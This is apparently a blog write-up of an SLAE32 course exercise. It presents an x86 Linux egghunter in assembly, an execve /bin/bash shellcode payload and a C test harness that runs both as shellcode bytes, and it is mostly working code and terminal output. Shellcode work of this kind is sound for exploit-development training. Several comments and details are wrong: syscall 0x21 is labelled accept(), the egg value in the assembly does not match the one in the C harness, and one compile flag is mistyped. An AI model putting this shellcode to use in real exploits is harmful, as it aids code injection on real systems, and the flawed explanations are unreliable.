---
title: SLAE32 Assignment 3 -- Egghunter Shellcode
date: 2019-9-15
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE32.jpg
tags:
  - egghunter
  - execve
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcode
---
![](/assets/images/SLAE32.png)

## Overview
For our fourth assignment in the SLAE32 course we were tasked with creating an egghunter.  
What is an Egg Hunter?   
An Egghunter is a piece of injectable shellcode that will search the memory of the running program for the a specific, larger payload. Once the Egghunter finds the larger payload, it will pass program control to it by executing it.  

The larger payload that our Egghunter will search for and execute will be the `execve-stack` shellcode provided in the SLAE32 course.  

## Egghunter Assembly Code
```nasm
; Filename: eggHunter.asm
; Author:   boku
global _start
_start:
; Configure Egg in EBX
  mov ebx, 0x29C09090  ; sub eax, eax + NOP + NOP
; Clear EAX, ECX, EDX
  xor ecx, ecx         ; Clears the ECX Register. 
  mul ecx              ; ECX*EAX. Result is stored in EDX:EAX. This clears the EDX and EAX registers 
; Jump here to move forward a memory page
nextPage:              ; Increments the memory address stored in EDX by 4096 Bytes (a memory page)
  or dx, 0xfff         ; 0xfff = 4096. This is the size of Linux Memory pages.
; Jump here to move forward 4 bytes on a memory page
nextAddress:           ; Increments the memory address stored in EDX by 4 Bytes (a memory address in IA-32 bit)
  inc edx              ; in combo with the or dx above, this moves the memory scanner EDX by a page
                       ; in combo with the cmp [edx+0x4] below, this aligns EDX so it will scan the next memory address
 ; 4095*2=8190+1=8191. 
 ;                                      --> (inc edx) 4095+1  -->  (inc edx) 8191+1
 ; or dx when edx is: \x00000000        |   \x00001000 = 4096 |    \x00002000 = 8192
 ;               OR   \x00000FFF        |   \x00000FFF = 4095 |    \x00000FFF = 4095
 ;          RESULTS:  \x00000FFF = 4095--   \x00001FFF = 8191--    \x00002FFF = 12287
; Save the registers before accept() system-call because they will be altered after the call
 pusha                 ; Pushes all 16-bit registers onto the stack
 lea ebx, [edx+0x4]    ; Increments the Memory Address of EDX by 4 Bytes.
                       ;  Stores the value stored at EDX+4 into the EBX register
 mov al, 0x21          ; System Call for accept() 
 int 0x80              ; Executes accept()
; Check if memory page is accessible
 cmp al, 0xf2          ; The return value of accept() is stored in EAX. Checks if access is denied
; Load the registers that were stored onto the stack

 popa                  ; Pops all 16-bit registers from the stack
; if accept() could not access the memory page, go to the next page
 jz nextPage           ; If page access is denied, check the next memory page 
; if accept() could access the memory page, check if the egg is in the first memory location on the page
 cmp [edx], ebx
; if the egg is not there, then increment our location on the page by 1 byte and check there
 jnz nextAddress
; if the egg is there, check the next for bytes to make sure it is our payload and not the egghunter itself.
 cmp [edx+0x4], ebx
; if the egg isn't there then it is a fluke or is our egghunter. Check the next address.
 jnz nextAddress
; if the egg is there twice, then we found our payload. Jump to the memory location on that page
;  and transfer control to our payload.
 jmp edx
```

## Compiling and Testing the EggHunter
### Compiling the EggHunter Assembly Code
```nasm 
root# nasm -f elf32 eggHunter.asm -o eggHunter.o
root# ld -z execstack eggHunter.o -o eggHunter
```

### Compiling a Payload for the EggHunter to Find
#### SLAE32 Execve-Stack `/bin/bash` Shellcode
```nasm
; Filename: execve-stack.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com

global _start

section .text
_start:

; PUSH the first null dword
xor eax, eax
push eax
; PUSH ////bin/bash (12)
push 0x68736162
push 0x2f6e6962
push 0x2f2f2f2f
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 11
int 0x80
```
#### Compiling the Payload
```console
t# nasm -f elf32 execve-stack.nasm -p execve-stack.o
root# ld -z execstack execve-stack.o -o execve-stack
```

#### Testing the Payload
```console
root# ps -p $$
  PID TTY          TIME CMD
14383 pts/5    00:00:00 bash
root# ./execve-stack 
root# ps -p $$
  PID TTY          TIME CMD
  584 pts/5    00:00:00 bash
```

### Testing the EggHunter in a Host Program
#### Host Program in C
```c
// Filename: testEggHunter.c
// Author:   boku
#include <stdio.h>
#include <string.h>
#define egg "\x90\x50\x90\x50"
unsigned char payload[] =
egg
egg
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f"
"\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

unsigned char egghunter[] =
"\xbb"
egg
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21"
"\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9"
"\xff\xe2";

int main()
{
    printf("Memory Location of Payload: %p\n", payload);
    printf("Size of Egghunter:          %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

#### Compiling the Host Program 
```c
root# gcc testEggHunter.c -o testEggHunter -fno-stack-protector -z execstack
```

#### Testing the EggHunter in the Host Program
```console
root# ps -p $$
  PID TTY          TIME CMD
14383 pts/5    00:00:00 bash
root# ./testEggHunter 
Memory Location of Payload: 0x804a040
Size of Egghunter:          39
root# ps -p $$
  PID TTY          TIME CMD
 3048 pts/5    00:00:00 bash
```
